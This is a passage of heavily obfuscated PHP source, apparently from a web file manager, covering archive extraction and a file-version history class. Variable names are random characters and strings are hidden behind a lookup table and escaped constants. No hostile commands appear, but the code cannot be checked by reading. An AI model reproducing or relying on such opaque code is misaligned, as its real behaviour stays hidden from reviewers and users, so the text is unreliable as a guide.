$Øàİ®ëù); self::unzipErrorCheck($›Ïº€É÷, array($±…±Û¥µ[1297], $âÈÒàöÛ, $“éËŠİ®)); @file_put_contents($£ç†‚ã¦, json_encode($›Ïº€É÷[$±…±Û¥µ[1298]])); } return @json_decode(IO::getContent($£ç†‚ã¦), !0); } IO::fileOut($“éËŠİ®[$±…±Û¥µ[232]], $­Ùğ»©, get_path_this($Š¦ß™Àç[$±…±Û¥µ[32]])); die; } private static function zipFileList($Ë×Ü°Ñò, $‡áµäÙú = false) { $—˜§ÕÌ =& $_SERVER[¡¬ıÜ ƒ]; $¶İ©ˆÎ = array(); foreach ($Ë×Ü°Ñò as $Êƒ÷ÄçÅ) { $¾À±âõ = $Êƒ÷ÄçÅ[$—˜§ÕÌ[87]]; if ($‡áµäÙú) { $¾À±âõ = self::copy($Êƒ÷ÄçÅ[$—˜§ÕÌ[87]], $‡áµäÙú, $—˜§ÕÌ[908]); } else { $È×î›ë = self::init($Êƒ÷ÄçÅ[$—˜§ÕÌ[87]]); if ($È×î›ë->getType() == $—˜§ÕÌ[109]) { $¾À±âõ = $È×î›ë->path; } } if ($¾À±âõ && self::local()->exist($¾À±âõ)) { $¶İ©ˆÎ[$Êƒ÷ÄçÅ[$—˜§ÕÌ[87]]] = $¾À±âõ; } } if (!empty($¶İ©ˆÎ)) { return array_values($¶İ©ˆÎ); } show_json(LNG($—˜§ÕÌ[1257]), !1); } private static function localFilePath($éöí®¨Ù) { $ŞÕÂ¾„è =& $_SERVER[¡¬ıÜ ƒ]; $ı¶ê¨Ø¿ = KodIO::parse($éöí®¨Ù); if ($ı¶ê¨Ø¿[$ŞÕÂ¾„è[33]] == KodIO::KOD_SOURCE) { $‹–Îäî§ = Model($ŞÕÂ¾„è[914])->fileInfoGet(KodIO::sourceID($éöí®¨Ù)); if (!$‹–Îäî§[$ŞÕÂ¾„è[87]]) { show_json($ŞÕÂ¾„è[1299], !1); } $éöí®¨Ù = $‹–Îäî§[$ŞÕÂ¾„è[87]]; } $¸„û´€× = self::init($éöí®¨Ù); if ($¸„û´€×->pathParse[$ŞÕÂ¾„è[1243]]) { $éöí®¨Ù = $¸„û´€×->pathParse[$ŞÕÂ¾„è[1243]]; $¸„û´€× = self::init($éöí®¨Ù); } $ÉÉƒôõÀ = $¸„û´€×->getType(); if ($ÉÉƒôõÀ == $ŞÕÂ¾„è[109] || $ÉÉƒôõÀ == $ŞÕÂ¾„è[1300]) { if (!$¸„û´€×->exist($¸„û´€×->path)) { show_json(LNG($ŞÕÂ¾„è[108]), !1); } return $¸„û´€×->path; } return !1; } public static function unzipPart($ûÎô£İ, $¨¹¯¾Ö = -1) { $ˆ»¢›•ì =& $_SERVER[¡¬ıÜ ƒ]; $¥’©‘Éø = IO::pathThis($ûÎô£İ); if (!$¨¹¯¾Ö || $¨¹¯¾Ö == -1) { $ÑÒ›İñ = array(array($ˆ»¢›•ì[32] => $¥’©‘Éø, $ˆ»¢›•ì[1286] => -1)); $ÑÒ›İñ[0][$ˆ»¢›•ì[1301]] = $ÑÒ›İñ[0][$ˆ»¢›•ì[32]]; } else { if (is_array($¨¹¯¾Ö)) { $ÑÒ›İñ = $¨¹¯¾Ö; $·òòßÂÎ = count($ÑÒ›İñ) - 1; for ($³¤Ô·î­ = 0; $³¤Ô·î­ <= $·òòßÂÎ; $³¤Ô·î­++) { $ê–á«÷ = $ÑÒ›İñ[$³¤Ô·î­]; $Ö¢ƒ›ÔË = get_path_this($ê–á«÷[$ˆ»¢›•ì[32]]) . (checkExtSafe($ê–á«÷[$ˆ»¢›•ì[32]]) ? $ˆ»¢›•ì[12] : $ˆ»¢›•ì[1302]); $ÑÒ›İñ[$³¤Ô·î­][$ˆ»¢›•ì[1301]] = $ˆ»¢›•ì[1303] . intval($ê–á«÷[$ˆ»¢›•ì[1286]]) . $ˆ»¢›•ì[464] . $Ö¢ƒ›ÔË; if ($³¤Ô·î­ == 0) { continue; } $ÑÒ›İñ[$³¤Ô·î­][$ˆ»¢›•ì[1301]] = $ÑÒ›İñ[$³¤Ô·î­ - 1][$ˆ»¢›•ì[1301]] . $ˆ»¢›•ì[1304] . $ÑÒ›İñ[$³¤Ô·î­][$ˆ»¢›•ì[1301]]; } } } if (!is_array($ÑÒ›İñ) || count($ÑÒ›İñ) == 0) { return !1; } $å¯ï°¢  = $ÑÒ›İñ[count($ÑÒ›İñ) - 1]; if (!IO::exist($ûÎô£İ)) { return !1; } $Ã€Âµ•İ = TEMP_FILES . $ˆ»¢›•ì[1305] . kodIO::hashPathSafe($ûÎô£İ) . $ˆ»¢›•ì[8]; $ú—©ş½Ñ = $Ã€Âµ•İ . $å¯ï°¢ [$ˆ»¢›•ì[1301]]; mk_dir($Ã€Âµ•İ); file_put_contents(TEMP_FILES . $ˆ»¢›•ì[1277], $ˆ»¢›•ì[12]); if (IO::exist($ú—©ş½Ñ)) { return array($ˆ»¢›•ì[232] => $ú—©ş½Ñ, $ˆ»¢›•ì[1285] => $ÑÒ›İñ, $ˆ»¢›•ì[1287] => $Ã€Âµ•İ); } $•×Ç½éÆ = self::localFilePath($ûÎô£İ); if (!$•×Ç½éÆ) { $•×Ç½éÆ = $Ã€Âµ•İ . $ˆ»¢›•ì[1306]; if (!IO::exist($•×Ç½éÆ)) { self::copy($ûÎô£İ, $Ã€Âµ•İ, !1, get_path_this($•×Ç½éÆ)); } } if (!$•×Ç½éÆ || !IO::exist($•×Ç½éÆ)) { return !1; } if ($å¯ï°¢ [$ˆ»¢›•ì[1286]] == -1) { return array($ˆ»¢›•ì[232] => $•×Ç½éÆ, $ˆ»¢›•ì[1285] => $ÑÒ›İñ, $ˆ»¢›•ì[1287] => $Ã€Âµ•İ); } $·’Æ×ª = $•×Ç½éÆ; foreach ($ÑÒ›İñ as $³¤Ô·î­ => $ê–á«÷) { if (!$ê–á«÷ || $ê–á«÷[$ˆ»¢›•ì[1286]] == $ˆ»¢›•ì[1284]) { break; } if (substr($ê–á«÷[$ˆ»¢›•ì[32]], -1, 1) == $ˆ»¢›•ì[8]) { break; } $ÓÄË¢– = in_array(get_path_ext($ê–á«÷[$ˆ»¢›•ì[1301]]), array($ˆ»¢›•ì[390], $ˆ»¢›•ì[1291], $ˆ»¢›•ì[1292], $ˆ»¢›•ì[1293], $ˆ»¢›•ì[1294], $ˆ»¢›•ì[1295])); $òâ…¸éÏ = $³¤Ô·î­ == count($ÑÒ›İñ) - 1 && $ÓÄË¢–; $½Â–±Ññ = $Ã€Âµ•İ . $ê–á«÷[$ˆ»¢›•ì[1301]]; $á£·òõº = $Ã€Âµ•İ . get_path_this($ê–á«÷[$ˆ»¢›•ì[32]]); if (IO::exist($½Â–±Ññ)) { $·’Æ×ª = $½Â–±Ññ; continue; } $ˆµ‰¡ô = $³¤Ô·î­ == 0 ? get_path_ext($¥’©‘Éø) : get_path_ext($·’Æ×ª); $ĞË’ëã = KodArchive::extract(self::iconvSystem($·’Æ×ª), $Ã€Âµ•İ, $ê–á«÷[$ˆ»¢›•ì[1286]], $ç÷ã¾–Ø, $ˆµ‰¡ô); self::unzipErrorCheck($ĞË’ëã, array($ˆ»¢›•ì[1307], $ûÎô£İ, $ÑÒ›İñ, $ê–á«÷, $½Â–±Ññ)); if (IO::exist($á£·òõº)) { IO::rename($á£·òõº, get_path_this($½Â–±Ññ)); } $·’Æ×ª = $½Â–±Ññ; } $ú—©ş½Ñ = $·’Æ×ª; return array($ˆ»¢›•ì[232] => $·’Æ×ª, $ˆ»¢›•ì[1285] => $ÑÒ›İñ, $ˆ»¢›•ì[1287] => $Ã€Âµ•İ); } private static function unzipErrorCheck($“Î²ûÔ´, $áøÏòƒØ = false) { $¢ÉôğØ =& $_SERVER[¡¬ıÜ ƒ]; if ($“Î²ûÔ´[$¢ÉôğØ[1308]]) { return !0; } write_log(array($¢ÉôğØ[1309], $“Î²ûÔ´, $áøÏòƒØ), $¢ÉôğØ[1310]); show_json($¢ÉôğØ[1311] . json_encode($“Î²ûÔ´[$¢ÉôğØ[1298]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $òƒÖ¨î =& $_SERVER[¡¬ıÜ ƒ]; $îµÕüŠ• = $GLOBALS[$òƒÖ¨î[6]][$òƒÖ¨î[92]]; if ($îµÕüŠ•[$òƒÖ¨î[1312]] != 1) { return; } if ($îµÕüŠ•[$òƒÖ¨î[1313]] <= 0) { return; } if (isset($_REQUEST[$òƒÖ¨î[1314]]) && $_REQUEST[$òƒÖ¨î[1314]] == $òƒÖ¨î[91]) { return; } Hook::bind($òƒÖ¨î[1315], $òƒÖ¨î[1316]); Hook::bind($òƒÖ¨î[1317], $òƒÖ¨î[1318]); Hook::bind($òƒÖ¨î[1319], $òƒÖ¨î[1320]); Hook::bind($òƒÖ¨î[1321], $òƒÖ¨î[1322]); Hook::bind($òƒÖ¨î[1323], $òƒÖ¨î[1324]); Hook::bind($òƒÖ¨î[1325], $òƒÖ¨î[1326]); } public static function eventBeforeUpload($Ş‰œ¬öñ) { if ($Ş‰œ¬öñ[3] && $Ş‰œ¬öñ[3] != REPEAT_REPLACE) { return; } $Ç²èÌ“ = self::parsePath($Ş‰œ¬öñ[0]); if (!$Ç²èÌ“) { return; } self::add($Ç²èÌ“); } public static function eventBeforeEdit($ĞÂğÕ÷¼) { $ŒƒãÁ¯¢ = self::parsePath($ĞÂğÕ÷¼[0]); if (!$ŒƒãÁ¯¢) { return; } self::add($ŒƒãÁ¯¢); } public static function eventBeforeCopyFile($âÅş , $ÛæğĞ§³, $È¯´ø’², $Ë¥ùŠÑÇ, $÷„§´Úş, $¸àÙÂÒ) { $ÁÃ¹¾Ò… =& $_SERVER[¡¬ıÜ ƒ]; if (isset($È¯´ø’²->_data[$ÁÃ¹¾Ò…[1247]]) && $È¯´ø’²->_data[$ÁÃ¹¾Ò…[1247]]) { return; } $çÉÜúÛî = $È¯´ø’²->getPathOuter($Ë¥ùŠÑÇ); $ØŒ«óÕ… = self::parsePath($çÉÜúÛî); if (!$ØŒ«óÕ…) { return; } self::add($ØŒ«óÕ…); } public static function eventBeforeRename($èŒ„é³õ) { $ “°Ãá =& $_SERVER[¡¬ıÜ ƒ]; $˜¤ÔÂêÉ = self::parsePath($èŒ„é³õ[0]); if (!$˜¤ÔÂêÉ) { return; } $Ìàı£ æ = self::checkInHistory($˜¤ÔÂêÉ); if (!$Ìàı£ æ) { return; } if ($Ìàı£ æ[$ “°Ãá[33]] == $ “°Ãá[232]) { $æ¢¬È = self::listData($˜¤ÔÂêÉ); if ($æ¢¬È && $æ¢¬È[$ “°Ãá[447]]) { self::moveHistory($˜¤ÔÂêÉ, $èŒ„é³õ[1]); } } else { IO::rename($Ìàı£ æ[$ “°Ãá[87]], $èŒ„é³õ[1]); } } public static function eventBeforeMove($‘ŠçíÒÊ) { $ƒù‹Ö¢å =& $_SERVER[¡¬ıÜ ƒ]; $¨ÇÙà±Ú = self::parsePath($‘ŠçíÒÊ[0]); if (!$¨ÇÙà±Ú) { return; } $ç¶úäõÛ = self::parsePath($‘ŠçíÒÊ[1]); if (!$ç¶úäõÛ) { return; } $›æ¨Á°ç = $‘ŠçíÒÊ[3]; $¾’×‡ªÜ = self::checkInHistory($¨ÇÙà±Ú); if (!$¾’×‡ªÜ) { return; } $úäˆÌÔ = self::pathHistory($ç¶úäõÛ); if ($¾’×‡ªÜ[$ƒù‹Ö¢å[33]] == $ƒù‹Ö¢å[232]) { $¶€ˆ­ÇÀ = self::listData($¨ÇÙà±Ú); $’›µû¢ƒ = rtrim($ç¶úäõÛ, $ƒù‹Ö¢å[8]) . $ƒù‹Ö¢å[8] . ($›æ¨Á°ç ? $›æ¨Á°ç : get_path_this($¨ÇÙà±Ú)); $ğªùÙ‡Ó = self::listData($’›µû¢ƒ); if ($¶€ˆ­ÇÀ && $¶€ˆ­ÇÀ[$ƒù‹Ö¢å[447]] && $ğªùÙ‡Ó && $ğªùÙ‡Ó[$ƒù‹Ö¢å[447]]) { return self::clear($¨ÇÙà±Ú); } if ($¶€ˆ­ÇÀ && $¶€ˆ­ÇÀ[$ƒù‹Ö¢å[447]]) { self::moveHistory($¨ÇÙà±Ú, $›æ¨Á°ç, $úäˆÌÔ); } } else { IO::move($¾’×‡ªÜ[$ƒù‹Ö¢å[87]], $úäˆÌÔ, !1, $›æ¨Á°ç); self::clearEmptyFolder(IO::pathFather($¾’×‡ªÜ[$ƒù‹Ö¢å[87]])); } } public static function eventAfterRemove($öá¤Œ, $µËëüİ—) { $““…„œ‘ =& $_SERVER[¡¬ıÜ ƒ]; if (!$µËëüİ—) { return; } $’Éúôæ = self::parsePath($öá¤Œ[0]); if (!$’Éúôæ) { return; } $åîã = self::checkInHistory($’Éúôæ); if (!$åîã) { return; } if ($åîã[$““…„œ‘[33]] == $““…„œ‘[232]) { $öòç£ßÑ = self::listData($’Éúôæ, !1); if ($öòç£ßÑ && $öòç£ßÑ[$““…„œ‘[447]]) { self::clear($’Éúôæ, !1); } } else { IO::remove($åîã[$““…„œ‘[87]]); self::clearEmptyFolder(IO::pathFather($åîã[$““…„œ‘[87]])); } } private static function checkInHistory($×¥Øæµİ) { $ê—ĞşüÇ = self::pathHistory($×¥Øæµİ); if (!IO::exist($ê—ĞşüÇ)) { $ê—ĞşüÇ .= $_SERVER[¡¬ıÜ ƒ][1327]; } return IO::exist($ê—ĞşüÇ) ? IO::info($ê—ĞşüÇ) : !1; } private static function parsePath($×ÚŒÙíå) { $¬£Î’ Ñ =& $_SERVER[¡¬ıÜ ƒ]; if (!$×ÚŒÙíå) { return !1; } if (isset($GLOBALS[$¬£Î’ Ñ[1328]]) && $GLOBALS[$¬£Î’ Ñ[1328]]) { return; } $Áïıª§À = KodIO::parse($×ÚŒÙíå); $Ä•ç„òë = $Áïıª§À[$¬£Î’ Ñ[33]]; $ø»Ö­µ = !$Ä•ç„òë || $Ä•ç„òë == KodIO::KOD_IO || $Ä•ç„òë == KodIO::KOD_SHARE_ITEM; if (!$ø»Ö­µ || !$Áïıª§À[$¬£Î’ Ñ[1329]]) { return !1; } if (substr($×ÚŒÙíå, 0, strlen(DATA_PATH . $¬£Î’ Ñ[1330])) == DATA_PATH . $¬£Î’ Ñ[1330]) { return !1; } if ($Ä•ç„òë == KodIO::KOD_SHARE_ITEM) { $ºòØÒªé = IO::init($×ÚŒÙíå); if ($ºòØÒªé->pathParse[$¬£Î’ Ñ[1243]]) { return self::parsePath($ºòØÒªé->pathParse[$¬£Î’ Ñ[1243]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $“ñŠ¤úØ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¬£Î’ Ñ[1331]); foreach ($“ñŠ¤úØ as $¿ôÚ×º) { if (!$Ä•ç„òë && substr($×ÚŒÙíå, 0, strlen($¿ôÚ×º)) == $¿ôÚ×º) { return !1; } } self::log($GLOBALS[$¬£Î’ Ñ[1238]] . $¬£Î’ Ñ[1332] . $×ÚŒÙíå); return $×ÚŒÙíå; } private static function pathHistory($½½¦È™â) { $ˆª¬äúº =& $_SERVER[¡¬ıÜ ƒ]; $ß©Üúº‰ = self::$_historyBase . ltrim(KodIO::clear($½½¦È™â), $ˆª¬äúº[8]); $ß©Üúº‰ = str_replace(array($ˆª¬äúº[1333]), array($ˆª¬äúº[1334]), $ß©Üúº‰); return $ß©Üúº‰; } public static function log($ÚÔÁ’œ) { } public static function historyCount($–Æƒ€¦û) { $¥›¹¦© =& $_SERVER[¡¬ıÜ ƒ]; $‡ĞÈíì = array(); $‚ÕŒºµ = array(); foreach ($–Æƒ€¦û as $ºªÁÀ¿å) { $¢©ñæôó = get_path_father($ºªÁÀ¿å); if (!$‚ÕŒºµ[$¢©ñæôó]) { $‚ÕŒºµ[$¢©ñæôó] = array(); } $‚ÕŒºµ[$¢©ñæôó][] = get_path_this($ºªÁÀ¿å); } foreach ($‚ÕŒºµ as $¢©ñæôó => $®ÃˆÒ³) { $İ‰’©Ã© = self::parsePath($¢©ñæôó); if (!$İ‰’©Ã©) { continue; } foreach ($®ÃˆÒ³ as $‚Òô…·¬) { $ãâæ²É = self::listData(rtrim($İ‰’©Ã©, $¥›¹¦©[8]) . $¥›¹¦©[8] . $‚Òô…·¬, !1); if ($ãâæ²É && $ãâæ²É[$¥›¹¦©[447]]) { $‡ĞÈíì[rtrim($¢©ñæôó, $¥›¹¦©[8]) . $¥›¹¦©[8] . $‚Òô…·¬] = count($ãâæ²É[$¥›¹¦©[447]]); } } } return $‡ĞÈíì; } public static function add($ê¼Ğ£Ö) { $ûíï¼ì =& $_SERVER[¡¬ıÜ ƒ]; $’ìœ‡ = self::listData($ê¼Ğ£Ö); if (!$’ìœ‡) { return; } $Á¢›¨ˆÁ = Model($ûíï¼ì[850])->get($ûíï¼ì[1335]); $ä²ÃÌ«’ = intval($GLOBALS[$ûíï¼ì[6]][$ûíï¼ì[92]][$ûíï¼ì[1313]]); $Ï’Ë•À = $Á¢›¨ˆÁ == $ûíï¼ì[1336] ? min(5, $ä²ÃÌ«’) : $ä²ÃÌ«’; if ($ä²ÃÌ«’ <= 0) { return; } $Ã¯—í¢¯ = IO::info($ê¼Ğ£Ö); $¨®¹ºİ¡ = $’ìœ‡[$ûíï¼ì[447]]; if ($Ã¯—í¢¯[$ûíï¼ì[79]] == 0) { return; } if ($Ã¯—í¢¯[$ûíï¼ì[79]] >= 1024 * 1024 * 500) { return !1; } $’°ËíÛ = IO::hashSimple($ê¼Ğ£Ö); if ($¨®¹ºİ¡ && $¨®¹ºİ¡[0][$ûíï¼ì[677]] == $’°ËíÛ) { return !0; } if (array_key_exists($ûíï¼ì[235], $Ã¯—í¢¯) && !$Ã¯—í¢¯[$ûíï¼ì[235]]) { return !1; } $—¢æ• = short_id(time()); $òê—¶š¨ = array($ûíï¼ì[477] => $—¢æ•, $ûíï¼ì[677] => $’°ËíÛ, $ûíï¼ì[32] => $Ã¯—í¢¯[$ûíï¼ì[32]] . $ûíï¼ì[10] . date($ûíï¼ì[1337]) . rand_string(1), $ûíï¼ì[79] => $Ã¯—í¢¯[$ûíï¼ì[79]], $ûíï¼ì[529] => USER_ID, $ûíï¼ì[233] => time(), $ûíï¼ì[1338] => $ûíï¼ì[12]); IO::mkdir($’ìœ‡[$ûíï¼ì[1339]]); $ßİ½üæ­ = IO::copy($ê¼Ğ£Ö, $’ìœ‡[$ûíï¼ì[1339]], !1, $òê—¶š¨[$ûíï¼ì[32]]); if (!$ßİ½üæ­) { self::clearEmptyFolder($’ìœ‡[$ûíï¼ì[1339]]); return !1; } array_unshift($¨®¹ºİ¡, $òê—¶š¨); if (count($¨®¹ºİ¡) > $Ï’Ë•À) { $à„€‚¥‚ = array_slice($¨®¹ºİ¡, $Ï’Ë•À); foreach ($à„€‚¥‚ as $ñÉï½Ëš) { IO::remove($’ìœ‡[$ûíï¼ì[1339]] . $ñÉï½Ëš[$ûíï¼ì[32]]); } $¨®¹ºİ¡ = array_slice($¨®¹ºİ¡, 0, $Ï’Ë•À); } return self::saveData($’ìœ‡[$ûíï¼ì[1340]], $¨®¹ºİ¡); } public static function remove($Æ£™ü, $Äˆº‚­) { $ÆªÓÔéš =& $_SERVER[¡¬ıÜ ƒ]; $±¼Š—¯ø = self::listData($Æ£™ü); $Â¦Ê¶Œ³ = array(); if (!$±¼Š—¯ø) { return !1; } foreach ($±¼Š—¯ø[$ÆªÓÔéš[447]] as $¤Çº¡±å) { if ($¤Çº¡±å[$ÆªÓÔéš[477]] == $Äˆº‚­) { IO::remove($±¼Š—¯ø[$ÆªÓÔéš[1339]] . $¤Çº¡±å[$ÆªÓÔéš[32]]); continue; } $Â¦Ê¶Œ³[] = $¤Çº¡±å; } return self::saveData($±¼Š—¯ø[$ÆªÓÔéš[1340]], $Â¦Ê¶Œ³); } public static function clear($®ÔÄ½, $¨Ä Ú¥û = true) { $ÀÂøÏâÕ =& $_SERVER[¡¬ıÜ ƒ]; $à˜Ûè»ñ = self::listData($®ÔÄ½, $¨Ä Ú¥û); if (!$à˜Ûè»ñ) { return !1; } foreach ($à˜Ûè»ñ[$ÀÂøÏâÕ[447]] as $íŠã‰¨ì) { IO::remove($à˜Ûè»ñ[$ÀÂøÏâÕ[1339]] . $íŠã‰¨ì[$ÀÂøÏâÕ[32]]); } return self::saveData($à˜Ûè»ñ[$ÀÂøÏâÕ[1340]], array()); } public static function moveHistory($¹´Èı†, $‚î¹‡Ã = '', $ŒªÁÛÄ­ = '') { $È—ÙÑç =& $_SERVER[¡¬ıÜ ƒ]; $éáŠ‹İ = self::listData($¹´Èı†, !1); if (!$éáŠ‹İ || !$éáŠ‹İ[$È—ÙÑç[447]]) { return !1; } $ƒÀ€Ó¬Ü = $È—ÙÑç[1327]; $‚î¹‡Ã = $‚î¹‡Ã ? $‚î¹‡Ã : get_path_this($¹´Èı†); $ŒªÁÛÄ­ = $ŒªÁÛÄ­ ? $ŒªÁÛÄ­ : $éáŠ‹İ[$È—ÙÑç[1339]]; $âº”êâ = substr(get_path_this($éáŠ‹İ[$È—ÙÑç[1340]]), 0, -strlen($ƒÀ€Ó¬Ü)); foreach ($éáŠ‹İ[$È—ÙÑç[447]] as $’Ş„ÚÊ‰ => $ÚäÒ•¼) { $êº€¿ĞŠ = $‚î¹‡Ã . substr($ÚäÒ•¼[$È—ÙÑç[32]], strlen($âº”êâ)); $‹ôßã€„ = IO::move($éáŠ‹İ[$È—ÙÑç[1339]] . $ÚäÒ•¼[$È—ÙÑç[32]], $ŒªÁÛÄ­, !1, $êº€¿ĞŠ); if ($‹ôßã€„) { $éáŠ‹İ[$È—ÙÑç[447]][$’Ş„ÚÊ‰][$È—ÙÑç[32]] = $êº€¿ĞŠ; } } $éáŠ‹İ[$È—ÙÑç[1340]] = IO::move($éáŠ‹İ[$È—ÙÑç[1340]], $ŒªÁÛÄ­, !1, $‚î¹‡Ã . $ƒÀ€Ó¬Ü); self::saveData($éáŠ‹İ[$È—ÙÑç[1340]], $éáŠ‹İ[$È—ÙÑç[447]]); self::clearEmptyFolder($éáŠ‹İ[$È—ÙÑç[1339]]); } public static function rollback($Ö´È‚À¥, $ø¿•‹ÂÙ) { $âµÑ•Ñá =& $_SERVER[¡¬ıÜ ƒ]; $à‰¢…¾Å = self::listData($Ö´È‚À¥); if (!$à‰¢…¾Å) { return; } $®š¹¸Î¸ = IO::info($Ö´È‚À¥); foreach ($à‰¢…¾Å[$âµÑ•Ñá[447]] as $ıÚòäá³ => $™ÎæóÖ) { if ($™ÎæóÖ[$âµÑ•Ñá[477]] == $ø¿•‹ÂÙ) { self::add($Ö´È‚À¥); $¡Å²­¸— = $à‰¢…¾Å[$âµÑ•Ñá[1339]] . $™ÎæóÖ[$âµÑ•Ñá[32]]; $§Ñ÷û­ = IO::copy($¡Å²­¸—, IO::pathFather($Ö´È‚À¥), REPEAT_REPLACE, $®š¹¸Î¸[$âµÑ•Ñá[32]]); if ($§Ñ÷û­) { self::remove($Ö´È‚À¥, $ø¿•‹ÂÙ); } return $§Ñ÷û­; } } return !1; } public static function setDetail($÷™ö‚°ê, $ßºéÌ©, $øÉ´ºÀ¦) { $Äëˆâ²ì =& $_SERVER[¡¬ıÜ ƒ]; $‘„Ñ²Ã” = self::listData($÷™ö‚°ê); if (!$‘„Ñ²Ã”) { return; } foreach ($‘„Ñ²Ã”[$Äëˆâ²ì[447]] as $§œËì¿Ğ => $Àª˜Îî°) { if ($Àª˜Îî°[$Äëˆâ²ì[477]] == $ßºéÌ©) { $‘„Ñ²Ã”[$Äëˆâ²ì[447]][$§œËì¿Ğ][$Äëˆâ²ì[1338]] = $øÉ´ºÀ¦; self::saveData($‘„Ñ²Ã”[$Äëˆâ²ì[1340]], $‘„Ñ²Ã”[$Äëˆâ²ì[447]]); return !0; } } return !1; } public static function fileInfo($ÙÒƒÔâå, $’¤ÍÏ×) { $ñ’Óé¼ü =& $_SERVER[¡¬ıÜ ƒ]; $ô×¼®·È = self::listData($ÙÒƒÔâå); if (!$ô×¼®·È) { show_json(LNG($ñ’Óé¼ü[108]), !1); } $ßº–ï¾ = $ñ’Óé¼ü[12]; foreach ($ô×¼®·È[$ñ’Óé¼ü[447]] as $ÇéÇäŸ => $õ°«´µÊ) { if ($õ°«´µÊ[$ñ’Óé¼ü[477]] != $’¤ÍÏ×) { continue; } $ßº–ï¾ = $ô×¼®·È[$ñ’Óé¼ü[1339]] . $õ°«´µÊ[$ñ’Óé¼ü[32]]; break; } if (!$ßº–ï¾) { show_json(LNG($ñ’Óé¼ü[108]), !1); } return IO::info($ßº–ï¾); } public static function fileOut($ÛÒ¹Ÿ£á, $ö†Ì¾¦â, $¤»ßğû˜ = false) { $ÌùşÈâÍ =& $_SERVER[¡¬ıÜ ƒ]; $Ã´ÚìÔ¯ = self::fileInfo($ÛÒ¹Ÿ£á, $ö†Ì¾¦â); $Âúöô©ƒ =& $GLOBALS[$ÌùşÈâÍ[7]]; $¤»ßğû˜ = isset($Âúöô©ƒ[$ÌùşÈâÍ[1290]]) && $Âúöô©ƒ[$ÌùşÈâÍ[1290]] == 1; if (isset($Âúöô©ƒ[$ÌùşÈâÍ[33]]) && $Âúöô©ƒ[$ÌùşÈâÍ[33]] == $ÌùşÈâÍ[1341]) { return IO::fileOutImage($Ã´ÚìÔ¯[$ÌùşÈâÍ[87]], $Âúöô©ƒ[$ÌùşÈâÍ[1342]]); } IO::fileOut($Ã´ÚìÔ¯[$ÌùşÈâÍ[87]], $¤»ßğû˜, get_path_this($ÛÒ¹Ÿ£á)); } public static function listData($ª´ŒÙÈ‰, $›¸§ø¦— = true) { $¾–âŒĞ— =& $_SERVER[¡¬ıÜ ƒ]; if ($›¸§ø¦— && !IO::exist($ª´ŒÙÈ‰)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ª´ŒÙÈ‰, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ ªİò¦… = self::pathHistory($ª´ŒÙÈ‰); $ô‰‡ÒÂ = array($¾–âŒĞ—[1340] => $ ªİò¦… . $¾–âŒĞ—[1327], $¾–âŒĞ—[1339] => rtrim(get_path_father($ ªİò¦…), $¾–âŒĞ—[8]) . $¾–âŒĞ—[8], $¾–âŒĞ—[447] => array()); $ŸÆ±†… = IO::getContent($ô‰‡ÒÂ[$¾–âŒĞ—[1340]]); if ($ŸÆ±†…) { $àï½ÍşÛ = json_decode($ŸÆ±†…, !0); if (is_array($àï½ÍşÛ)) { $ô‰‡ÒÂ[$¾–âŒĞ—[447]] = $àï½ÍşÛ; } } return $ô‰‡ÒÂ; } private static function saveData($²àñƒ©ä, $ÈËúö‘) { $ÂÊû·ÀÁ =& $_SERVER[¡¬ıÜ ƒ]; self::log($ÂÊû·ÀÁ[1343] . $²àñƒ©ä . $ÂÊû·ÀÁ[74] . count($ÈËúö‘), $ÂÊû·ÀÁ[832]); if ($ÈËúö‘) { return IO::setContent($²àñƒ©ä, json_encode($ÈËúö‘)); } $»Ç› Î = IO::pathFather($²àñƒ©ä); IO::remove($²àñƒ©ä); self::clearEmptyFolder($»Ç› Î); return !0; } public static function clearEmptyFolder($°ŞÓ¸°‹) { $Ç¹õ©­Û =& $_SERVER[¡¬ıÜ ƒ]; if (trim($°ŞÓ¸°‹, $Ç¹õ©­Û[8]) == trim(self::$_historyBase, $Ç¹õ©­Û[8])) { return; } $§“œÊËŠ = IO::pathFather($°ŞÓ¸°‹); $ÎşÙƒ…ù = IO::has($°ŞÓ¸°‹, !0); if ($ÎşÙƒ…ù[$Ç¹õ©­Û[241]] > 0 || $ÎşÙƒ…ù[$Ç¹õ©­Û[242]] > 0) { return; } IO::remove($°ŞÓ¸°‹); self::clearEmptyFolder($§“œÊËŠ); } private static function getBasePath() { $îà£Šß€ =& $_SERVER[¡¬ıÜ ƒ]; $±¾î¼­ = Model($îà£Šß€[1344])->get($îà£Šß€[1345]); if ($±¾î¼­) { if (!IO::exist($±¾î¼­)) { IO::mkdir($±¾î¼­); } if (get_path_this($±¾î¼­) == $îà£Šß€[1330]) { $ƒÜâÜãê = $îà£Šß€[1346] . rand_string(8); @rename($±¾î¼­, get_path_father($±¾î¼­) . $îà£Šß€[8] . $ƒÜâÜãê); $±¾î¼­ = DATA_PATH . $ƒÜâÜãê . $îà£Šß€[8]; file_put_contents(DATA_PATH . $îà£Šß€[1277], $îà£Šß€[12]); Model($îà£Šß€[1344])->set($îà£Šß€[1345], $±¾î¼­); } return $±¾î¼­; } $±¾î¼­ = DATA_PATH . $îà£Šß€[1346] . rand_string(8) . $îà£Šß€[8]; $±¾î¼­ = IO::mkdir($±¾î¼­); $±¾î¼­ = rtrim($±¾î¼­, $îà£Šß€[8]) . $îà£Šß€[8]; file_put_contents($±¾î¼­ . $îà£Šß€[1277], $îà£Šß€[12]); file_put_contents(DATA_PATH . $îà£Šß€[1277], $îà£Šß€[12]); Model($îà£Šß€[1344])->set($îà£Šß€[1345], $±¾î¼­); return $±¾î¼­; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\x65\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\106\151\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\x69\x6c\145\x54\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\122\x6f\157\164\123\145\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK 